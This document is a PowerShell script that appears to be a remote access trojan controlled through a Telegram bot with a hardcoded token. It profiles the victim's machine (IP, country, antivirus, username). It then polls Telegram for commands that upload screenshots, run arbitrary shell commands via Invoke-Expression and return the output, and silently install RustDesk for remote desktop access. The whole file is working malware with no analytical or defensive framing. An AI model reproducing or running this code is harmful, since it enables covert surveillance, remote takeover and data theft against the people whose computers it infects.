$botToken = "7319129301:AAGJeISBdsqDQ2Gn9mW37RKEUmDT-Mnf9UZo"
$authorizedChatId = 7730103423
$taskfolder = "$env:temp\abshdkf"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Net.Http

function screenshot([Drawing.Rectangle]$bounds, $path) {
    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save($path)
    $graphics.Dispose()
    $bmp.Dispose()
}

try {
    $public = (Invoke-RestMethod -Uri "https://ipinfo.io/ip").Trim()
}
catch {
    try {
        $public = (Invoke-RestMethod -Uri "https://ifconfig.me/ip").Trim()
    }
    catch {
        $public = "Unknown"
    }
}

$antivirus = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName
if (-not $antivirus) {
    $antivirus = "No Antivirus Detected"
}

$country = (Invoke-RestMethod -Uri "http://ip-api.com/json/").country
if (-not $country) {
    $country = "Unknown"
}

$username = $env:USERNAME
$timezone = (Get-TimeZone).Id

$inactivityThreshold = 3600
$lastState = "Active"
$lastUpdateId = 0
$sendMessages = $true  

while ($true) {
    $getUpdatesUrl = "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastUpdateId + 1)"
    try {
        $response = Invoke-RestMethod -Uri $getUpdatesUrl -Method Get
        if ($response.ok -and $response.result.Count -gt 0) {
            foreach ($update in $response.result) {
                $lastUpdateId = $update.update_id
                if ($update.message.chat.id -eq $authorizedChatId) {
                    $messageText = $update.message.text
                    
                    if ($messageText -match "^/off\s*$") {
                        $sendMessages = $false
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>bot is turned off.</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif ($messageText -match "^/on\s*$") {
                        $sendMessages = $true
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>bot is turned on.</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif ($messageText -match "^/kill\s*$") {
                        remove-item -path $taskfolder -recurse -force
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>dead</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif ($messageText -match "^/ping\s*$") {
                        $params = @{
                            chat_id    = $authorizedChatId
                            text       = "<pre>Listening...</pre>"
                            parse_mode = "HTML"
                        }
                        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                    }
                    elseif (-not $sendMessages) {
                        continue
                    }
                    else {
                        if ($messageText -match "^/desktop\s*$") {
                            $virtualScreen = [System.Windows.Forms.SystemInformation]::VirtualScreen
                            $bounds = [Drawing.Rectangle]::FromLTRB(
                                $virtualScreen.Left, 
                                $virtualScreen.Top, 
                                $virtualScreen.Left + $virtualScreen.Width, 
                                $virtualScreen.Top + $virtualScreen.Height
                            )
                            $randomFileName = [System.IO.Path]::GetRandomFileName() + ".png"
                            $screenshotPath = Join-Path -Path $env:TEMP -ChildPath $randomFileName

                            try {
                                screenshot $bounds $screenshotPath
                                $telegramApiUrl = "https://api.telegram.org/bot$botToken/sendPhoto"
                                $httpClient = New-Object System.Net.Http.HttpClient
                                $content = New-Object System.Net.Http.MultipartFormDataContent

                                $chatContent = New-Object System.Net.Http.StringContent($authorizedChatId.ToString())
                                $content.Add($chatContent, "chat_id")

                                $fileStream = [System.IO.File]::OpenRead($screenshotPath)
                                $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
                                $content.Add($fileContent, "photo", [System.IO.Path]::GetFileName($screenshotPath))

                                $response = $httpClient.PostAsync($telegramApiUrl, $content).Result
                            }
                            catch {
                                Write-Error "Screenshot error: $_"
                            }
                            finally {
                                if ($fileStream) { $fileStream.Dispose() }
                                if ($httpClient) { $httpClient.Dispose() }
                                if (Test-Path $screenshotPath) { Remove-Item -Path $screenshotPath -Force }
                            }
                        }
                        elseif ($messageText -match "^/terminal\s*\[([\s\S]+)\]$") {
                            $commandToRun = $matches[1]
                            $output = try {
                                Invoke-Expression $commandToRun 2>&1 | Out-String
                            } catch {
                                "Error executing command: $_"
                            }
                            $output = $output.Trim()
                            if (-not $output) { $output = "(No output from command)" }
                            if ($output.Length -gt 4000) { $output = $output.Substring(0, 4000) + "`n...(truncated)" }
                            
                            $params = @{
                                chat_id    = $authorizedChatId
                                text       = "<pre>$([System.Net.WebUtility]::HtmlEncode($output))</pre>"
                                parse_mode = "HTML"
                            }
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                        }
                        elseif ($messageText -match "^/installrustdesk\s*$") {
                            try {
                                Invoke-WebRequest -Uri "https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.exe" -OutFile "$env:temp\rustdesk.exe"
                                Start-Process -FilePath "$env:temp\rustdesk.exe" -ArgumentList "--silent-install" -NoNewWindow -Wait
                                $output = "RustDesk installed successfully."
                            }
                            catch {
                                $output = "Error installing RustDesk: $($_.Exception.Message)"
                            }
                            $params = @{
                                chat_id    = $authorizedChatId
                                text       = "<pre>$output</pre>"
                                parse_mode = "HTML"
                            }
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                        }
                        elseif ($messageText -match "^/uninstallrustdesk\s*$") {
                            try {
                                Stop-Process -Name "rustdesk" -Force -ErrorAction SilentlyContinue
                                $output = "RustDesk uninstalled successfully."
                            }
                            catch {
                                $output = "Error uninstalling RustDesk: $($_.Exception.Message)"
                            }
                            $params = @{
                                chat_id    = $authorizedChatId
                                text       = "<pre>$output</pre>"
                                parse_mode = "HTML"
                            }
                            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body $params
                        }
                    }
                }
            }
        }
    }
    catch {
        Write-Error "Update check error: $_"
    }
    
    Start-Sleep -Seconds 1
}
